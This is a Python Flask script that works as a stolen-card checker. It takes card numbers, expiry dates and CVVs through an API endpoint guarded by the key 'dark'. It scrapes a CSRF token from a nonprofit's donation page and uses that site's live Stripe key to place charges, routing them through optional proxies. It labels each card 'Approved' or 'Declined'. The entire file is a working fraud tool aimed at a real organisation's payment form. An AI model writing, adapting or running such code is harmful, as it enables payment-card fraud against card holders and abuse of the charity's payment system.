from flask import Flask, request, jsonify
import requests
import json
import time
import re
from urllib.parse import urlencode

app = Flask(__name__)

def get_csrf_token(session):
    url = 'https://swop.ourpowerbase.net/civicrm/contribute/transact?reset=1&id=25'
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://swop.ourpowerbase.net/',
    }
    
    try:
        response = session.get(url, headers=headers, timeout=30)
        response.raise_for_status()
        
        # Debug: Save the response to check what we're getting
        with open('debug_page.html', 'w', encoding='utf-8') as f:
            f.write(response.text)
        
        print("Page loaded successfully, looking for CSRF token...")
        
        # Try multiple patterns to find CSRF token
        csrf_patterns = [
            r'name="csrfToken"[^>]*value="([^"]+)"',
            r'csrfToken["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'data-csrf-token=["\']([^"\']+)["\']',
            r'csrf-token["\']?\s*content=["\']([^"\']+)["\']',
            r'<meta[^>]*name=["\']csrf-token["\'][^>]*content=["\']([^"\']+)["\']',
            r'<input[^>]*name=["\']csrfToken["\'][^>]*value=["\']([^"\']+)["\']',
            r'window\.csrfToken\s*=\s*["\']([^"\']+)["\']',
            r'CSRF_TOKEN["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        ]
        
        found_tokens = []
        for pattern in csrf_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            found_tokens.extend(matches)
        
        if found_tokens:
            print(f"Found CSRF tokens: {found_tokens}")
            # Return the first valid token (usually the longest one)
            valid_token = max(found_tokens, key=len)
            print(f"Using CSRF token: {valid_token}")
            return valid_token
        
        # If no patterns matched, try to find hidden input fields
        hidden_inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]*)"[^>]*value="([^"]*)"', response.text)
        for name, value in hidden_inputs:
            if 'csrf' in name.lower():
                print(f"Found CSRF in hidden input: {name}={value}")
                return value
        
        print("CSRF token not found in page. Checking cookies...")
        
        # Check if CSRF token is in cookies
        for cookie_name, cookie_value in session.cookies.items():
            if 'csrf' in cookie_name.lower():
                print(f"Found CSRF in cookie: {cookie_name}={cookie_value}")
                return cookie_value
        
        return None
        
    except Exception as e:
        print(f"Error getting CSRF token: {e}")
        return None

def create_payment_method(session, card_number, exp_month, exp_year, cvc):
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }

    data = {
        'type': 'card',
        'card[number]': card_number,
        'card[cvc]': cvc,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
        'guid': '56eb65c1-ed7e-45f6-8afd-0c118841732242f4d3',
        'muid': 'a0180020-aacf-4535-9db9-453252fd6662447bd5',
        'sid': '8e211884-9f66-40f4-bab4-1d2e050131e54bb196',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js%2F9c713d6d38%3B+stripe-js-v3%2F9c713d6d38%3B+card-element',
        'referrer': 'https%3A%2F%2Fswop.ourpowerbase.net',
        'time_on_page': str(int(time.time() * 1000)),
        'key': 'pk_live_51IlzILIj39zbqVwKOfD2RX6n9xe4R4XTRpca1U4I2aLw8an3Fd9jm8DE7rQ3NPciJT0J5Ec7FFrqVuyGxzm4rKCq00VjlFos2d'
    }

    try:
        response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        return response.json()
    except Exception as e:
        print(f"Error creating payment method: {e}")
        return {'error': {'message': str(e)}}

def process_payment(session, payment_method_id, csrf_token, amount):
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://swop.ourpowerbase.net',
        'Referer': 'https://swop.ourpowerbase.net/civicrm/contribute/transact?reset=1&id=25',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }

    # Format amount with 2 decimal places
    formatted_amount = f"{float(amount):.2f}"

    payload = {
        "paymentMethodID": payment_method_id,
        "amount": formatted_amount,
        "currency": "USD",
        "paymentProcessorID": "21",
        "description": "Support The Haven | SWOP PowerBase",
        "extraData": "darkboy3366@gmail.com;",
        "csrfToken": csrf_token,
        "captcha": ""
    }

    data = {
        'params': json.dumps(payload)
    }

    try:
        response = session.post(
            'https://swop.ourpowerbase.net/civicrm/ajax/api4/StripePaymentintent/ProcessPublic',
            headers=headers,
            data=data,
            timeout=30
        )
        print(f"Payment response status: {response.status_code}")
        print(f"Payment response text: {response.text}")
        return response.json()
    except Exception as e:
        print(f"Error processing payment: {e}")
        return {'error_code': 0, 'error_message': str(e)}

@app.route('/index.cpp', methods=['GET'])
def process_payment_route():
    # Get parameters from query string
    key = request.args.get('key')
    cc = request.args.get('cc')
    amount = request.args.get('amount')
    proxy = request.args.get('proxy')
    
    # Validate required parameters
    if not key or not cc or not amount:
        return jsonify({
            'status': 'Declined',
            'response': 'Missing required parameters: key, cc, or amount'
        }), 400
    
    if key != 'dark':
        return jsonify({
            'status': 'Declined',
            'response': 'Invalid key'
        }), 401
    
    # Validate amount
    try:
        amount_float = float(amount)
        if amount_float <= 0:
            return jsonify({
                'status': 'Declined',
                'response': 'Amount must be greater than 0'
            }), 400
    except ValueError:
        return jsonify({
            'status': 'Declined',
            'response': 'Invalid amount format'
        }), 400
    
    # Parse CC data (format: CC|MM|YYYY|CVV)
    try:
        cc_parts = cc.split('|')
        if len(cc_parts) != 4:
            return jsonify({
                'status': 'Declined',
                'response': 'Invalid CC format. Use: CC|MM|YYYY|CVV'
            }), 400
            
        card_number, exp_month, exp_year, cvc = cc_parts
        
        # Basic validation
        card_number = card_number.strip()
        exp_month = exp_month.strip()
        exp_year = exp_year.strip()
        cvc = cvc.strip()
        
        if not card_number.isdigit() or len(card_number) < 13 or len(card_number) > 19:
            return jsonify({
                'status': 'Declined',
                'response': 'Invalid card number'
            }), 400
            
    except:
        return jsonify({
            'status': 'Declined',
            'response': 'Invalid CC format'
        }), 400
    
    # Create session with proper headers
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })
    
    if proxy:
        try:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_url = f"http://{user}:{password}@{ip}:{port}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_url = f"http://{ip}:{port}"
            else:
                proxy_url = f"http://{proxy}"
            
            session.proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            print(f"Using proxy: {proxy_url}")
        except:
            print("Invalid proxy format, using direct connection")
    
    try:
        # Get CSRF token
        print("Attempting to get CSRF token...")
        csrf_token = get_csrf_token(session)
        
        if not csrf_token:
            # Try one more time with different headers
            print("Retrying CSRF token extraction...")
            session.headers.update({
                'Referer': 'https://swop.ourpowerbase.net/',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            })
            csrf_token = get_csrf_token(session)
            
        if not csrf_token:
            return jsonify({
                'status': 'Declined',
                'response': 'Failed to get CSRF token. Please check if the site is accessible.'
            }), 500
        
        # Create payment method
        print("Creating payment method...")
        payment_method_result = create_payment_method(session, card_number, exp_month, exp_year, cvc)
        
        if 'id' not in payment_method_result:
            error_message = payment_method_result.get('error', {}).get('message', 'Failed to create payment method')
            print(f"Payment method creation failed: {error_message}")
            return jsonify({
                'status': 'Declined',
                'response': error_message
            }), 500
        
        payment_method_id = payment_method_result['id']
        print(f"Payment method created: {payment_method_id}")
        
        # Process payment with dynamic amount
        print(f"Processing payment of ${amount}...")
        payment_result = process_payment(session, payment_method_id, csrf_token, amount)
        
        # Determine status based on response
        if payment_result.get('error_code') == 0:
            error_message = payment_result.get('error_message', 'Payment declined')
            
            # Check for specific messages that might indicate OTP requirement
            if any(word in error_message.lower() for word in ['otp', '3d', 'secure', 'authentication', 'verification']):
                return jsonify({
                    'status': 'Approved',
                    'response': 'OTP_REQUIRED'
                }), 200
            else:
                return jsonify({
                    'status': 'Declined',
                    'response': error_message
                }), 200
                
        else:
            # If no error code or different response structure, assume success
            return jsonify({
                'status': 'Approved',
                'response': f'Payment of ${amount} successful'
            }), 200
            
    except Exception as e:
        print(f"Unexpected error: {e}")
        return jsonify({
            'status': 'Declined',
            'response': f'Processing error: {str(e)}'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
